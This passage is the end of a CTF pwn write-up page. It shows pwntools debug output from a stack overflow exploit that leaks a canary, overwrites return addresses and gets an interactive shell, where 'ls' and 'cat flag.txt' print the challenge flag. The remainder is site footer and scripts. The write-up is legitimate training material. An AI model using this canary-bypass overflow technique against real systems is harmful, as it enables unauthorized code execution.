</span><span id=__span-24-25><a id=__codelineno-24-25 name=__codelineno-24-25 href=#__codelineno-24-25></a><span class=w>    </span><span class=m>00000070</span><span class=w>  </span><span class=m>74</span><span class=w> </span><span class=m>65</span><span class=w> </span><span class=m>72</span><span class=w> </span><span class=m>20</span><span class=w>  </span>6b<span class=w> </span><span class=m>65</span><span class=w> </span><span class=m>79</span><span class=w> </span><span class=m>20</span><span class=w>  </span>3a<span class=w> </span><span class=m>20</span><span class=w>                     </span>│ter<span class=w> </span>│key<span class=w> </span>│:<span class=w> </span>│
</span><span id=__span-24-26><a id=__codelineno-24-26 name=__codelineno-24-26 href=#__codelineno-24-26></a><span class=w>    </span>0000007a
</span><span id=__span-24-27><a id=__codelineno-24-27 name=__codelineno-24-27 href=#__codelineno-24-27></a><span class=o>[</span>*<span class=o>]</span><span class=w> </span>canary:<span class=w> </span>b<span class=s1>&#39;\x006N\xc6=\x16\xd2C&#39;</span>
</span><span id=__span-24-28><a id=__codelineno-24-28 name=__codelineno-24-28 href=#__codelineno-24-28></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Sent<span class=w> </span>0x61<span class=w> </span>bytes:
</span><span id=__span-24-29><a id=__codelineno-24-29 name=__codelineno-24-29 href=#__codelineno-24-29></a><span class=w>    </span><span class=m>00000000</span><span class=w>  </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w>  </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w>  </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w>  </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w> </span><span class=m>41</span><span class=w>  </span>│AAAA│AAAA│AAAA│AAAA│
</span><span id=__span-24-30><a id=__codelineno-24-30 name=__codelineno-24-30 href=#__codelineno-24-30></a><span class=w>    </span>*
</span><span id=__span-24-31><a id=__codelineno-24-31 name=__codelineno-24-31 href=#__codelineno-24-31></a><span class=w>    </span><span class=m>00000020</span><span class=w>  </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w>  </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w>  </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w>  </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w>  </span>│BBBB│BBBB│BBBB│BBBB│
</span><span id=__span-24-32><a id=__codelineno-24-32 name=__codelineno-24-32 href=#__codelineno-24-32></a><span class=w>    </span>*
</span><span id=__span-24-33><a id=__codelineno-24-33 name=__codelineno-24-33 href=#__codelineno-24-33></a><span class=w>    </span><span class=m>00000040</span><span class=w>  </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w>  </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>42</span><span class=w>  </span><span class=m>00</span><span class=w> </span><span class=m>36</span><span class=w> </span>4e<span class=w> </span>c6<span class=w>  </span>3d<span class=w> </span><span class=m>16</span><span class=w> </span>d2<span class=w> </span><span class=m>43</span><span class=w>  </span>│BBBB│BBBB│·6N·│<span class=o>=</span>··C│
</span><span id=__span-24-34><a id=__codelineno-24-34 name=__codelineno-24-34 href=#__codelineno-24-34></a><span class=w>    </span><span class=m>00000050</span><span class=w>  </span>1a<span class=w> </span><span class=m>10</span><span class=w> </span><span class=m>40</span><span class=w> </span><span class=m>00</span><span class=w>  </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>  </span><span class=m>96</span><span class=w> </span><span class=m>15</span><span class=w> </span><span class=m>40</span><span class=w> </span><span class=m>00</span><span class=w>  </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>  </span>│··@·│····│··@·│····│
</span><span id=__span-24-35><a id=__codelineno-24-35 name=__codelineno-24-35 href=#__codelineno-24-35></a><span class=w>    </span><span class=m>00000060</span><span class=w>  </span>0a<span class=w>                                                  </span>│·│
</span><span id=__span-24-36><a id=__codelineno-24-36 name=__codelineno-24-36 href=#__codelineno-24-36></a><span class=w>    </span><span class=m>00000061</span>
</span><span id=__span-24-37><a id=__codelineno-24-37 name=__codelineno-24-37 href=#__codelineno-24-37></a><span class=o>[</span>*<span class=o>]</span><span class=w> </span>Switching<span class=w> </span>to<span class=w> </span>interactive<span class=w> </span>mode
</span><span id=__span-24-38><a id=__codelineno-24-38 name=__codelineno-24-38 href=#__codelineno-24-38></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x11<span class=w> </span>bytes:
</span><span id=__span-24-39><a id=__codelineno-24-39 name=__codelineno-24-39 href=#__codelineno-24-39></a><span class=w>    </span>b<span class=s1>&#39;Wrong, go away !\n&#39;</span>
</span><span id=__span-24-40><a id=__codelineno-24-40 name=__codelineno-24-40 href=#__codelineno-24-40></a>Wrong,<span class=w> </span>go<span class=w> </span>away<span class=w> </span>!
</span><span id=__span-24-41><a id=__codelineno-24-41 name=__codelineno-24-41 href=#__codelineno-24-41></a>$<span class=w> </span>ls
</span><span id=__span-24-42><a id=__codelineno-24-42 name=__codelineno-24-42 href=#__codelineno-24-42></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Sent<span class=w> </span>0x3<span class=w> </span>bytes:
</span><span id=__span-24-43><a id=__codelineno-24-43 name=__codelineno-24-43 href=#__codelineno-24-43></a><span class=w>    </span>b<span class=s1>&#39;ls\n&#39;</span>
</span><span id=__span-24-44><a id=__codelineno-24-44 name=__codelineno-24-44 href=#__codelineno-24-44></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x16<span class=w> </span>bytes:
</span><span id=__span-24-45><a id=__codelineno-24-45 name=__codelineno-24-45 href=#__codelineno-24-45></a><span class=w>    </span>b<span class=s1>&#39;chal  flag.txt\n&#39;</span>
</span><span id=__span-24-46><a id=__codelineno-24-46 name=__codelineno-24-46 href=#__codelineno-24-46></a>chal<span class=w>  </span>flag.txt
</span><span id=__span-24-47><a id=__codelineno-24-47 name=__codelineno-24-47 href=#__codelineno-24-47></a>$<span class=w> </span>cat<span class=w> </span>flag.txt
</span><span id=__span-24-48><a id=__codelineno-24-48 name=__codelineno-24-48 href=#__codelineno-24-48></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Sent<span class=w> </span>0xd<span class=w> </span>bytes:
</span><span id=__span-24-49><a id=__codelineno-24-49 name=__codelineno-24-49 href=#__codelineno-24-49></a><span class=w>    </span>b<span class=s1>&#39;cat flag.txt\n&#39;</span>
</span><span id=__span-24-50><a id=__codelineno-24-50 name=__codelineno-24-50 href=#__codelineno-24-50></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x3e<span class=w> </span>bytes:
</span><span id=__span-24-51><a id=__codelineno-24-51 name=__codelineno-24-51 href=#__codelineno-24-51></a><span class=w>    </span>b<span class=s1>&#39;flag{unl0ck_y0ur_1m4gin4ti0ns_esc4p3_th3_r00m_0f_l1m1t4t10n5}\n&#39;</span>
</span><span id=__span-24-52><a id=__codelineno-24-52 name=__codelineno-24-52 href=#__codelineno-24-52></a>flag<span class=o>{</span>unl0ck_y0ur_1m4gin4ti0ns_esc4p3_th3_r00m_0f_l1m1t4t10n5<span class=o>}</span>
</span></code></pre></div> <p>flag: <code>flag{unl0ck_y0ur_1m4gin4ti0ns_esc4p3_th3_r00m_0f_l1m1t4t10n5}</code></p> <aside class=md-source-file> <span class=md-source-file__fact> <span class=md-icon title="Last update"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1-2.1-2M12.5 7v5.2l4 2.4-1 1L11 13V7h1.5M11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2v1.8Z"/></svg> </span> <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class=timeago datetime=2023-12-25T18:42:40+00:00 locale=en></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2023-12-25</span> </span> <span class=md-source-file__fact> <span class=md-icon title=Created> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3h-2Z"/></svg> </span> <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class=timeago datetime=2023-12-25T18:27:32+00:00 locale=en></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2023-12-25</span> </span> </aside> <h2 id=__comments>Comments</h2> <!-- Insert generated snippet here --> <script src=https://giscus.app/client.js data-repo=gr007-40/gr007-40.github.io data-repo-id=R_kgDOJxLhLw data-category=General data-category-id=DIC_kwDOJxLhL84CYf1r data-mapping=pathname data-strict=1 data-reactions-enabled=1 data-emit-metadata=1 data-input-position=top data-theme=preferred_color_scheme data-lang=en data-loading=lazy crossorigin=anonymous async>
  </script> <!-- Synchronize Giscus theme with palette --> <script>
  var giscus = document.querySelector("script[src*=giscus]")

  /* Set palette on initial load */
  var palette = __md_get("__palette")
  if (palette && typeof palette.color === "object") {
    var theme = palette.color.scheme === "slate" ? "dark" : "light"
    giscus.setAttribute("data-theme", theme)
  }

  /* Register event handlers after documented loaded */
  document.addEventListener("DOMContentLoaded", function () {
    var ref = document.querySelector("[data-md-component=palette]")
    ref.addEventListener("change", function () {
      var palette = __md_get("__palette")
      if (palette && typeof palette.color === "object") {
        var theme = palette.color.scheme === "slate" ? "dark" : "light"

        /* Instruct Giscus to change theme */
        var frame = document.querySelector(".giscus-frame")
        frame.contentWindow.postMessage(
          {giscus: {setConfig: {theme}}},
          "https://giscus.app"
        )
      }
    })
  })
</script> </article> </div> <script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script> </div> <button type=button class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg> Back to top </button> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../../../tags.html class="md-footer__link md-footer__link--prev" aria-label="Previous: Tags"> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </div> <div class=md-footer__title> <span class=md-footer__direction> Previous </span> <div class=md-ellipsis> Tags </div> </div> </a> <a href=../bcactf/index.html class="md-footer__link md-footer__link--next" aria-label="Next: bcactf 2023"> <div class=md-footer__title> <span class=md-footer__direction> Next </span> <div class=md-ellipsis> bcactf 2023 </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2023 - 2023 Md Abdullahil Kafi </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> <div class=md-social> <a href=https://github.com/gr007-40 target=_blank rel=noopener title=github.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 496 512"><!-- Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg> </a> <a href=https://www.facebook.com/gr00t.40 target=_blank rel=noopener title=www.facebook.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><!-- Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M512 256C512 114.6 397.4 0 256 0S0 114.6 0 256c0 120 82.7 220.8 194.2 248.5V334.2h-52.8V256h52.8v-33.7c0-87.1 39.4-127.5 125-127.5 16.2 0 44.2 3.2 55.7 6.4V172c-6-.6-16.5-1-29.6-1-42 0-58.2 15.9-58.2 57.2V256h83.6l-14.4 78.2H287v175.9C413.8 494.8 512 386.9 512 256z"/></svg> </a> <a href=https://www.linkedin.com/in/gr007 target=_blank rel=noopener title=www.linkedin.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg> </a> <a href=https://twitter.com/groot_40 target=_blank rel=noopener title=twitter.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><!-- Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg> </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <div class=md-progress data-md-component=progress role=progressbar></div> <script id=__config type=application/json>{"base": "../../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tracking", "navigation.tabs", "navigation.sections", "navigation.prune", "navigation.indexes", "navigation.top", "navigation.footer", "toc.follow", "search.suggest", "search.share", "search.highlight", "header.autohide", "content.code.copy", "content.code.annotate", "content.action.view"], "search": "../../../assets/javascripts/workers/search.f886a092.min.js", "tags": {"pwn": "pwn"}, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script> <script src=../../../assets/javascripts/bundle.d7c377c4.min.js></script> <script src=../../../js/timeago.min.js></script> <script src=../../../js/timeago_mkdocs_material.js></script> <script src=../../../javascripts/mathjax.js></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script> <script src=../../../javascripts/katex.js></script> <script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/katex.min.js></script> <script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/contrib/auto-render.min.js></script> <script>document$.subscribe(() => {const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});})</script></body> </html>